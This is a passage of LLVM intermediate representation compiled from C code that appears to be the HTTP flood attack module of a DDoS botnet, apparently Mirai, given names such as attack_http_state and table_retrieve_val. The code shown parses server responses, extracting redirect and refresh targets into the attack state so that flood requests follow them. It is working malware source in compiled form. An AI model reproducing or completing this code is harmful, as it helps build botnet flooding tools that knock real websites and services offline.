  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds i8, i8* %1382, i64 %1384
  %1386 = load i8, i8* %1385, align 1
  %1387 = sext i8 %1386 to i32
  %1388 = icmp eq i32 %1387, 61
  br i1 %1388, label %1389, label %1437

; <label>:1389:                                   ; preds = %1381
  %1390 = load i32, i32* %10, align 4
  store i32 %1390, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1391

; <label>:1391:                                   ; preds = %1410, %1389
  %1392 = load i32, i32* %10, align 4
  %1393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1393, i32 0, i32 15
  %1395 = load i32, i32* %1394, align 4
  %1396 = icmp slt i32 %1392, %1395
  br i1 %1396, label %1397, label %1413

; <label>:1397:                                   ; preds = %1391
  %1398 = load i8*, i8** %49, align 8
  %1399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1399, i32 0, i32 16
  %1401 = load i32, i32* %10, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1400, i64 0, i64 %1402
  %1404 = getelementptr inbounds [128 x i8], [128 x i8]* %1403, i32 0, i32 0
  %1405 = load i32, i32* %50, align 4
  %1406 = call signext i8 @util_strncmp(i8* %1398, i8* %1404, i32 %1405)
  %1407 = icmp ne i8 %1406, 0
  br i1 %1407, label %1408, label %1409

; <label>:1408:                                   ; preds = %1397
  store i32 1, i32* %51, align 4
  br label %1413

; <label>:1409:                                   ; preds = %1397
  br label %1410

; <label>:1410:                                   ; preds = %1409
  %1411 = load i32, i32* %10, align 4
  %1412 = add nsw i32 %1411, 1
  store i32 %1412, i32* %10, align 4
  br label %1391

; <label>:1413:                                   ; preds = %1408, %1391
  %1414 = load i32, i32* %51, align 4
  %1415 = icmp ne i32 %1414, 0
  br i1 %1415, label %1436, label %1416

; <label>:1416:                                   ; preds = %1413
  %1417 = load i8*, i8** %49, align 8
  %1418 = call i32 @util_strlen(i8* %1417)
  %1419 = icmp slt i32 %1418, 128
  br i1 %1419, label %1420, label %1435

; <label>:1420:                                   ; preds = %1416
  %1421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1421, i32 0, i32 16
  %1423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1423, i32 0, i32 15
  %1425 = load i32, i32* %1424, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1422, i64 0, i64 %1426
  %1428 = getelementptr inbounds [128 x i8], [128 x i8]* %1427, i32 0, i32 0
  %1429 = load i8*, i8** %49, align 8
  %1430 = call i32 @util_strcpy(i8* %1428, i8* %1429)
  %1431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1431, i32 0, i32 15
  %1433 = load i32, i32* %1432, align 4
  %1434 = add nsw i32 %1433, 1
  store i32 %1434, i32* %1432, align 4
  br label %1435

; <label>:1435:                                   ; preds = %1420, %1416
  br label %1436

; <label>:1436:                                   ; preds = %1435, %1413
  br label %1437

; <label>:1437:                                   ; preds = %1436, %1381
  br label %1438

; <label>:1438:                                   ; preds = %1437, %1298
  %1439 = load i32, i32* %47, align 4
  %1440 = load i32, i32* %37, align 4
  %1441 = add nsw i32 %1440, %1439
  store i32 %1441, i32* %37, align 4
  br label %1263

; <label>:1442:                                   ; preds = %1277
  %1443 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1444 = load i32, i32* %12, align 4
  %1445 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1446 = call i32 @util_stristr(i8* %1443, i32 %1444, i8* %1445)
  %1447 = icmp ne i32 %1446, -1
  br i1 %1447, label %1448, label %1627

; <label>:1448:                                   ; preds = %1442
  %1449 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1450 = load i32, i32* %12, align 4
  %1451 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1452 = call i32 @util_stristr(i8* %1449, i32 %1450, i8* %1451)
  store i32 %1452, i32* %52, align 4
  %1453 = load i32, i32* %52, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1454
  %1456 = load i8, i8* %1455, align 1
  %1457 = sext i8 %1456 to i32
  %1458 = icmp eq i32 %1457, 32
  br i1 %1458, label %1459, label %1462

; <label>:1459:                                   ; preds = %1448
  %1460 = load i32, i32* %52, align 4
  %1461 = add nsw i32 %1460, 1
  store i32 %1461, i32* %52, align 4
  br label %1462

; <label>:1462:                                   ; preds = %1459, %1448
  %1463 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1464 = load i32, i32* %52, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds i8, i8* %1463, i64 %1465
  %1467 = load i32, i32* %12, align 4
  %1468 = load i32, i32* %52, align 4
  %1469 = sub nsw i32 %1467, %1468
  %1470 = call i32 @util_memsearch(i8* %1466, i32 %1469, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1470, i32* %53, align 4
  %1471 = load i32, i32* %53, align 4
  %1472 = icmp ne i32 %1471, -1
  br i1 %1472, label %1473, label %1626

; <label>:1473:                                   ; preds = %1462
  %1474 = load i32, i32* %52, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1475
  store i8* %1476, i8** %54, align 8
  %1477 = load i32, i32* %53, align 4
  %1478 = icmp sge i32 %1477, 2
  br i1 %1478, label %1479, label %1482

; <label>:1479:                                   ; preds = %1473
  %1480 = load i32, i32* %53, align 4
  %1481 = sub nsw i32 %1480, 2
  store i32 %1481, i32* %53, align 4
  br label %1482

; <label>:1482:                                   ; preds = %1479, %1473
  %1483 = load i32, i32* %52, align 4
  %1484 = load i32, i32* %53, align 4
  %1485 = add nsw i32 %1483, %1484
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1486
  store i8 0, i8* %1487, align 1
  %1488 = load i32, i32* %53, align 4
  %1489 = add nsw i32 %1488, 1
  store i32 %1489, i32* %53, align 4
  %1490 = load i8*, i8** %54, align 8
  %1491 = load i32, i32* %53, align 4
  %1492 = call i32 @util_memsearch(i8* %1490, i32 %1491, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1493 = icmp eq i32 %1492, 4
  br i1 %1493, label %1494, label %1584

; <label>:1494:                                   ; preds = %1482
  store i32 7, i32* %10, align 4
  %1495 = load i8*, i8** %54, align 8
  %1496 = getelementptr inbounds i8, i8* %1495, i64 4
  %1497 = load i8, i8* %1496, align 1
  %1498 = sext i8 %1497 to i32
  %1499 = icmp eq i32 %1498, 115
  br i1 %1499, label %1500, label %1503

; <label>:1500:                                   ; preds = %1494
  %1501 = load i32, i32* %10, align 4
  %1502 = add nsw i32 %1501, 1
  store i32 %1502, i32* %10, align 4
  br label %1503

; <label>:1503:                                   ; preds = %1500, %1494
  %1504 = load i8*, i8** %54, align 8
  %1505 = load i8*, i8** %54, align 8
  %1506 = load i32, i32* %10, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds i8, i8* %1505, i64 %1507
  %1509 = load i32, i32* %53, align 4
  %1510 = load i32, i32* %10, align 4
  %1511 = sub nsw i32 %1509, %1510
  %1512 = sext i32 %1511 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1504, i8* %1508, i64 %1512, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1513

; <label>:1513:                                   ; preds = %1534, %1503
  %1514 = load i8*, i8** %54, align 8
  %1515 = load i32, i32* %10, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds i8, i8* %1514, i64 %1516
  %1518 = load i8, i8* %1517, align 1
  %1519 = sext i8 %1518 to i32
  %1520 = icmp ne i32 %1519, 0
  br i1 %1520, label %1521, label %1537

; <label>:1521:                                   ; preds = %1513
  %1522 = load i8*, i8** %54, align 8
  %1523 = load i32, i32* %10, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds i8, i8* %1522, i64 %1524
  %1526 = load i8, i8* %1525, align 1
  %1527 = sext i8 %1526 to i32
  %1528 = icmp eq i32 %1527, 47
  br i1 %1528, label %1529, label %1534

; <label>:1529:                                   ; preds = %1521
  %1530 = load i8*, i8** %54, align 8
  %1531 = load i32, i32* %10, align 4
  %1532 = sext i32 %1531 to i64
  %1533 = getelementptr inbounds i8, i8* %1530, i64 %1532
  store i8 0, i8* %1533, align 1
  br label %1537

; <label>:1534:                                   ; preds = %1521
  %1535 = load i32, i32* %10, align 4
  %1536 = add nsw i32 %1535, 1
  store i32 %1536, i32* %10, align 4
  br label %1513

; <label>:1537:                                   ; preds = %1529, %1513
  %1538 = load i8*, i8** %54, align 8
  %1539 = call i32 @util_strlen(i8* %1538)
  %1540 = icmp sgt i32 %1539, 0
  br i1 %1540, label %1541, label %1551

; <label>:1541:                                   ; preds = %1537
  %1542 = load i8*, i8** %54, align 8
  %1543 = call i32 @util_strlen(i8* %1542)
  %1544 = icmp slt i32 %1543, 128
  br i1 %1544, label %1545, label %1551

; <label>:1545:                                   ; preds = %1541
  %1546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1546, i32 0, i32 7
  %1548 = getelementptr inbounds [129 x i8], [129 x i8]* %1547, i32 0, i32 0
  %1549 = load i8*, i8** %54, align 8
  %1550 = call i32 @util_strcpy(i8* %1548, i8* %1549)
  br label %1551

; <label>:1551:                                   ; preds = %1545, %1541, %1537
  %1552 = load i8*, i8** %54, align 8
  %1553 = load i32, i32* %10, align 4
  %1554 = add nsw i32 %1553, 1
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds i8, i8* %1552, i64 %1555
  %1557 = call i32 @util_strlen(i8* %1556)
  %1558 = icmp slt i32 %1557, 256
  br i1 %1558, label %1559, label %1583

; <label>:1559:                                   ; preds = %1551
  %1560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1560, i32 0, i32 6
  %1562 = getelementptr inbounds [257 x i8], [257 x i8]* %1561, i32 0, i32 0
  %1563 = getelementptr inbounds i8, i8* %1562, i64 1
  call void @util_zero(i8* %1563, i32 255)
  %1564 = load i8*, i8** %54, align 8
  %1565 = load i32, i32* %10, align 4
  %1566 = add nsw i32 %1565, 1
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds i8, i8* %1564, i64 %1567
  %1569 = call i32 @util_strlen(i8* %1568)
  %1570 = icmp sgt i32 %1569, 0
  br i1 %1570, label %1571, label %1582

; <label>:1571:                                   ; preds = %1559
  %1572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1572, i32 0, i32 6
  %1574 = getelementptr inbounds [257 x i8], [257 x i8]* %1573, i32 0, i32 0
  %1575 = getelementptr inbounds i8, i8* %1574, i64 1
  %1576 = load i8*, i8** %54, align 8
  %1577 = load i32, i32* %10, align 4
  %1578 = add nsw i32 %1577, 1
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds i8, i8* %1576, i64 %1579
  %1581 = call i32 @util_strcpy(i8* %1575, i8* %1580)
  br label %1582

; <label>:1582:                                   ; preds = %1571, %1559
  br label %1583

; <label>:1583:                                   ; preds = %1582, %1551
  br label %1623

; <label>:1584:                                   ; preds = %1482
  %1585 = load i8*, i8** %54, align 8
  %1586 = getelementptr inbounds i8, i8* %1585, i64 0
  %1587 = load i8, i8* %1586, align 1
  %1588 = sext i8 %1587 to i32
  %1589 = icmp eq i32 %1588, 47
  br i1 %1589, label %1590, label %1622

; <label>:1590:                                   ; preds = %1584
  %1591 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1591, i32 0, i32 6
  %1593 = getelementptr inbounds [257 x i8], [257 x i8]* %1592, i32 0, i32 0
  %1594 = getelementptr inbounds i8, i8* %1593, i64 1
  call void @util_zero(i8* %1594, i32 255)
  %1595 = load i8*, i8** %54, align 8
  %1596 = load i32, i32* %10, align 4
  %1597 = add nsw i32 %1596, 1
  %1598 = sext i32 %1597 to i64
  %1599 = getelementptr inbounds i8, i8* %1595, i64 %1598
  %1600 = call i32 @util_strlen(i8* %1599)
  %1601 = icmp sgt i32 %1600, 0
  br i1 %1601, label %1602, label %1621

; <label>:1602:                                   ; preds = %1590
  %1603 = load i8*, i8** %54, align 8
  %1604 = load i32, i32* %10, align 4
  %1605 = add nsw i32 %1604, 1
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds i8, i8* %1603, i64 %1606
  %1608 = call i32 @util_strlen(i8* %1607)
  %1609 = icmp slt i32 %1608, 256
  br i1 %1609, label %1610, label %1621

; <label>:1610:                                   ; preds = %1602
  %1611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1611, i32 0, i32 6
  %1613 = getelementptr inbounds [257 x i8], [257 x i8]* %1612, i32 0, i32 0
  %1614 = getelementptr inbounds i8, i8* %1613, i64 1
  %1615 = load i8*, i8** %54, align 8
  %1616 = load i32, i32* %10, align 4
  %1617 = add nsw i32 %1616, 1
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds i8, i8* %1615, i64 %1618
  %1620 = call i32 @util_strcpy(i8* %1614, i8* %1619)
  br label %1621

; <label>:1621:                                   ; preds = %1610, %1602, %1590
  br label %1622

; <label>:1622:                                   ; preds = %1621, %1584
  br label %1623

; <label>:1623:                                   ; preds = %1622, %1583
  %1624 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1625 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1624, i32 0, i32 1
  store i8 1, i8* %1625, align 4
  br label %2441

; <label>:1626:                                   ; preds = %1462
  br label %1627

; <label>:1627:                                   ; preds = %1626, %1442
  %1628 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1629 = load i32, i32* %12, align 4
  %1630 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1631 = call i32 @util_stristr(i8* %1628, i32 %1629, i8* %1630)
  %1632 = icmp ne i32 %1631, -1
  br i1 %1632, label %1633, label %1963

; <label>:1633:                                   ; preds = %1627
  %1634 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1635 = load i32, i32* %12, align 4
  %1636 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1637 = call i32 @util_stristr(i8* %1634, i32 %1635, i8* %1636)
  store i32 %1637, i32* %55, align 4
  %1638 = load i32, i32* %55, align 4
  %1639 = sext i32 %1638 to i64
  %1640 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1639
  %1641 = load i8, i8* %1640, align 1
  %1642 = sext i8 %1641 to i32
  %1643 = icmp eq i32 %1642, 32
  br i1 %1643, label %1644, label %1647

; <label>:1644:                                   ; preds = %1633
  %1645 = load i32, i32* %55, align 4
  %1646 = add nsw i32 %1645, 1
  store i32 %1646, i32* %55, align 4
  br label %1647

; <label>:1647:                                   ; preds = %1644, %1633
  %1648 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1649 = load i32, i32* %55, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds i8, i8* %1648, i64 %1650
  %1652 = load i32, i32* %12, align 4
  %1653 = load i32, i32* %55, align 4
  %1654 = sub nsw i32 %1652, %1653
  %1655 = call i32 @util_memsearch(i8* %1651, i32 %1654, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1655, i32* %56, align 4
  %1656 = load i32, i32* %56, align 4
  %1657 = icmp ne i32 %1656, -1
  br i1 %1657, label %1658, label %1962

; <label>:1658:                                   ; preds = %1647
  %1659 = load i32, i32* %55, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1660
  store i8* %1661, i8** %57, align 8
  %1662 = load i32, i32* %56, align 4
  %1663 = icmp sge i32 %1662, 2
  br i1 %1663, label %1664, label %1667

; <label>:1664:                                   ; preds = %1658
  %1665 = load i32, i32* %56, align 4
  %1666 = sub nsw i32 %1665, 2
  store i32 %1666, i32* %56, align 4
  br label %1667

; <label>:1667:                                   ; preds = %1664, %1658
  %1668 = load i32, i32* %55, align 4
  %1669 = load i32, i32* %56, align 4
  %1670 = add nsw i32 %1668, %1669
  %1671 = sext i32 %1670 to i64
  %1672 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1671
  store i8 0, i8* %1672, align 1
  %1673 = load i32, i32* %56, align 4
  %1674 = add nsw i32 %1673, 1
  store i32 %1674, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1675

; <label>:1675:                                   ; preds = %1701, %1667
  %1676 = load i8*, i8** %57, align 8
  %1677 = load i32, i32* %10, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds i8, i8* %1676, i64 %1678
  %1680 = load i8, i8* %1679, align 1
  %1681 = sext i8 %1680 to i32
  %1682 = icmp ne i32 %1681, 0
  br i1 %1682, label %1683, label %1699

; <label>:1683:                                   ; preds = %1675
  %1684 = load i8*, i8** %57, align 8
  %1685 = load i32, i32* %10, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds i8, i8* %1684, i64 %1686
  %1688 = load i8, i8* %1687, align 1
  %1689 = sext i8 %1688 to i32
  %1690 = icmp sge i32 %1689, 48
  br i1 %1690, label %1691, label %1699

; <label>:1691:                                   ; preds = %1683
  %1692 = load i8*, i8** %57, align 8
  %1693 = load i32, i32* %10, align 4
  %1694 = sext i32 %1693 to i64
  %1695 = getelementptr inbounds i8, i8* %1692, i64 %1694
  %1696 = load i8, i8* %1695, align 1
  %1697 = sext i8 %1696 to i32
  %1698 = icmp sle i32 %1697, 57
  br label %1699

; <label>:1699:                                   ; preds = %1691, %1683, %1675
  %1700 = phi i1 [ false, %1683 ], [ false, %1675 ], [ %1698, %1691 ]
  br i1 %1700, label %1701, label %1704

; <label>:1701:                                   ; preds = %1699
  %1702 = load i32, i32* %10, align 4
  %1703 = add nsw i32 %1702, 1
  store i32 %1703, i32* %10, align 4
  br label %1675

; <label>:1704:                                   ; preds = %1699
  %1705 = load i8*, i8** %57, align 8
  %1706 = load i32, i32* %10, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds i8, i8* %1705, i64 %1707
  %1709 = load i8, i8* %1708, align 1
  %1710 = sext i8 %1709 to i32
  %1711 = icmp ne i32 %1710, 0
  br i1 %1711, label %1712, label %1961

; <label>:1712:                                   ; preds = %1704
  store i32 0, i32* %58, align 4
  %1713 = load i8*, i8** %57, align 8
  %1714 = load i32, i32* %10, align 4
  %1715 = sext i32 %1714 to i64
  %1716 = getelementptr inbounds i8, i8* %1713, i64 %1715
  store i8 0, i8* %1716, align 1
  %1717 = load i32, i32* %10, align 4
  %1718 = add nsw i32 %1717, 1
  store i32 %1718, i32* %10, align 4
  %1719 = load i8*, i8** %57, align 8
  %1720 = load i32, i32* %10, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds i8, i8* %1719, i64 %1721
  %1723 = load i8, i8* %1722, align 1
  %1724 = sext i8 %1723 to i32
  %1725 = icmp eq i32 %1724, 32
  br i1 %1725, label %1726, label %1729

; <label>:1726:                                   ; preds = %1712
  %1727 = load i32, i32* %10, align 4
  %1728 = add nsw i32 %1727, 1
  store i32 %1728, i32* %10, align 4
  br label %1729

; <label>:1729:                                   ; preds = %1726, %1712
  %1730 = load i8*, i8** %57, align 8
  %1731 = load i32, i32* %10, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds i8, i8* %1730, i64 %1732
  %1734 = load i8*, i8** %57, align 8
  %1735 = load i32, i32* %10, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds i8, i8* %1734, i64 %1736
  %1738 = call i32 @util_strlen(i8* %1737)
  %1739 = call i32 @util_stristr(i8* %1733, i32 %1738, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1740 = icmp ne i32 %1739, -1
  br i1 %1740, label %1741, label %1754

; <label>:1741:                                   ; preds = %1729
  %1742 = load i8*, i8** %57, align 8
  %1743 = load i32, i32* %10, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds i8, i8* %1742, i64 %1744
  %1746 = load i8*, i8** %57, align 8
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds i8, i8* %1746, i64 %1748
  %1750 = call i32 @util_strlen(i8* %1749)
  %1751 = call i32 @util_stristr(i8* %1745, i32 %1750, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1752 = load i32, i32* %10, align 4
  %1753 = add nsw i32 %1752, %1751
  store i32 %1753, i32* %10, align 4
  br label %1754

; <label>:1754:                                   ; preds = %1741, %1729
  %1755 = load i8*, i8** %57, align 8
  %1756 = load i32, i32* %10, align 4
  %1757 = sext i32 %1756 to i64
  %1758 = getelementptr inbounds i8, i8* %1755, i64 %1757
  %1759 = load i8, i8* %1758, align 1
  %1760 = sext i8 %1759 to i32
  %1761 = icmp eq i32 %1760, 34
  br i1 %1761, label %1762, label %1794

; <label>:1762:                                   ; preds = %1754
  %1763 = load i32, i32* %10, align 4
  %1764 = add nsw i32 %1763, 1
  store i32 %1764, i32* %10, align 4
  %1765 = load i8*, i8** %57, align 8
  %1766 = load i32, i32* %10, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds i8, i8* %1765, i64 %1767
  %1769 = load i8*, i8** %57, align 8
  %1770 = load i32, i32* %10, align 4
  %1771 = sext i32 %1770 to i64
  %1772 = getelementptr inbounds i8, i8* %1769, i64 %1771
  %1773 = call i32 @util_strlen(i8* %1772)
  %1774 = sub nsw i32 %1773, 1
  %1775 = sext i32 %1774 to i64
  %1776 = getelementptr inbounds i8, i8* %1768, i64 %1775
  %1777 = load i8, i8* %1776, align 1
  %1778 = sext i8 %1777 to i32
  %1779 = icmp eq i32 %1778, 34
  br i1 %1779, label %1780, label %1793

; <label>:1780:                                   ; preds = %1762
  %1781 = load i8*, i8** %57, align 8
  %1782 = load i32, i32* %10, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds i8, i8* %1781, i64 %1783
  %1785 = load i8*, i8** %57, align 8
  %1786 = load i32, i32* %10, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds i8, i8* %1785, i64 %1787
  %1789 = call i32 @util_strlen(i8* %1788)
  %1790 = sub nsw i32 %1789, 1
  %1791 = sext i32 %1790 to i64
  %1792 = getelementptr inbounds i8, i8* %1784, i64 %1791
  store i8 0, i8* %1792, align 1
  br label %1793

; <label>:1793:                                   ; preds = %1780, %1762
  br label %1794

; <label>:1794:                                   ; preds = %1793, %1754
  %1795 = load i8*, i8** %57, align 8
  %1796 = call i32 @util_atoi(i8* %1795, i32 10)
  store i32 %1796, i32* %58, align 4
  br label %1797

; <label>:1797:                                   ; preds = %1812, %1794
  %1798 = load i32, i32* %58, align 4
  %1799 = icmp sgt i32 %1798, 0
  br i1 %1799, label %1800, label %1810

; <label>:1800:                                   ; preds = %1797
  %1801 = load i32, i32* %58, align 4
  %1802 = icmp slt i32 %1801, 10
  br i1 %1802, label %1803, label %1810

; <label>:1803:                                   ; preds = %1800
  %1804 = load i32, i32* %27, align 4
  %1805 = load i32, i32* %58, align 4
  %1806 = add i32 %1804, %1805
  %1807 = zext i32 %1806 to i64
  %1808 = call i64 @time(i64* null) #6
  %1809 = icmp sgt i64 %1807, %1808
  br label %1810

; <label>:1810:                                   ; preds = %1803, %1800, %1797
  %1811 = phi i1 [ false, %1800 ], [ false, %1797 ], [ %1809, %1803 ]
  br i1 %1811, label %1812, label %1814

; <label>:1812:                                   ; preds = %1810
  %1813 = call i32 @sleep(i32 1)
  br label %1797

; <label>:1814:                                   ; preds = %1810
  %1815 = load i8*, i8** %57, align 8
  %1816 = load i32, i32* %10, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds i8, i8* %1815, i64 %1817
  store i8* %1818, i8** %57, align 8
  %1819 = load i8*, i8** %57, align 8
  %1820 = load i8*, i8** %57, align 8
  %1821 = call i32 @util_strlen(i8* %1820)
  %1822 = call i32 @util_stristr(i8* %1819, i32 %1821, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %1823 = icmp eq i32 %1822, 4
  br i1 %1823, label %1824, label %1914

; <label>:1824:                                   ; preds = %1814
  store i32 7, i32* %10, align 4
  %1825 = load i8*, i8** %57, align 8
  %1826 = getelementptr inbounds i8, i8* %1825, i64 4
  %1827 = load i8, i8* %1826, align 1
  %1828 = sext i8 %1827 to i32
  %1829 = icmp eq i32 %1828, 115
  br i1 %1829, label %1830, label %1833

; <label>:1830:                                   ; preds = %1824
  %1831 = load i32, i32* %10, align 4
  %1832 = add nsw i32 %1831, 1
  store i32 %1832, i32* %10, align 4
  br label %1833

; <label>:1833:                                   ; preds = %1830, %1824
  %1834 = load i8*, i8** %57, align 8
  %1835 = load i8*, i8** %57, align 8
  %1836 = load i32, i32* %10, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds i8, i8* %1835, i64 %1837
  %1839 = load i32, i32* %56, align 4
  %1840 = load i32, i32* %10, align 4
  %1841 = sub nsw i32 %1839, %1840
  %1842 = sext i32 %1841 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1834, i8* %1838, i64 %1842, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1843

; <label>:1843:                                   ; preds = %1864, %1833
  %1844 = load i8*, i8** %57, align 8
  %1845 = load i32, i32* %10, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds i8, i8* %1844, i64 %1846
  %1848 = load i8, i8* %1847, align 1
  %1849 = sext i8 %1848 to i32
  %1850 = icmp ne i32 %1849, 0
  br i1 %1850, label %1851, label %1867

; <label>:1851:                                   ; preds = %1843
  %1852 = load i8*, i8** %57, align 8
  %1853 = load i32, i32* %10, align 4
  %1854 = sext i32 %1853 to i64
  %1855 = getelementptr inbounds i8, i8* %1852, i64 %1854
  %1856 = load i8, i8* %1855, align 1
  %1857 = sext i8 %1856 to i32
  %1858 = icmp eq i32 %1857, 47
  br i1 %1858, label %1859, label %1864

; <label>:1859:                                   ; preds = %1851
  %1860 = load i8*, i8** %57, align 8
  %1861 = load i32, i32* %10, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds i8, i8* %1860, i64 %1862
  store i8 0, i8* %1863, align 1
  br label %1867

; <label>:1864:                                   ; preds = %1851
  %1865 = load i32, i32* %10, align 4
  %1866 = add nsw i32 %1865, 1
  store i32 %1866, i32* %10, align 4
  br label %1843

; <label>:1867:                                   ; preds = %1859, %1843
  %1868 = load i8*, i8** %57, align 8
  %1869 = call i32 @util_strlen(i8* %1868)
  %1870 = icmp sgt i32 %1869, 0
  br i1 %1870, label %1871, label %1881

; <label>:1871:                                   ; preds = %1867
  %1872 = load i8*, i8** %57, align 8
  %1873 = call i32 @util_strlen(i8* %1872)
  %1874 = icmp slt i32 %1873, 128
  br i1 %1874, label %1875, label %1881

; <label>:1875:                                   ; preds = %1871
  %1876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1876, i32 0, i32 7
  %1878 = getelementptr inbounds [129 x i8], [129 x i8]* %1877, i32 0, i32 0
  %1879 = load i8*, i8** %57, align 8
  %1880 = call i32 @util_strcpy(i8* %1878, i8* %1879)
  br label %1881

; <label>:1881:                                   ; preds = %1875, %1871, %1867
  %1882 = load i8*, i8** %57, align 8
  %1883 = load i32, i32* %10, align 4
  %1884 = add nsw i32 %1883, 1
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds i8, i8* %1882, i64 %1885
  %1887 = call i32 @util_strlen(i8* %1886)
  %1888 = icmp slt i32 %1887, 256
  br i1 %1888, label %1889, label %1913

; <label>:1889:                                   ; preds = %1881
  %1890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1890, i32 0, i32 6
  %1892 = getelementptr inbounds [257 x i8], [257 x i8]* %1891, i32 0, i32 0
  %1893 = getelementptr inbounds i8, i8* %1892, i64 1
  call void @util_zero(i8* %1893, i32 255)
  %1894 = load i8*, i8** %57, align 8
  %1895 = load i32, i32* %10, align 4
  %1896 = add nsw i32 %1895, 1
  %1897 = sext i32 %1896 to i64
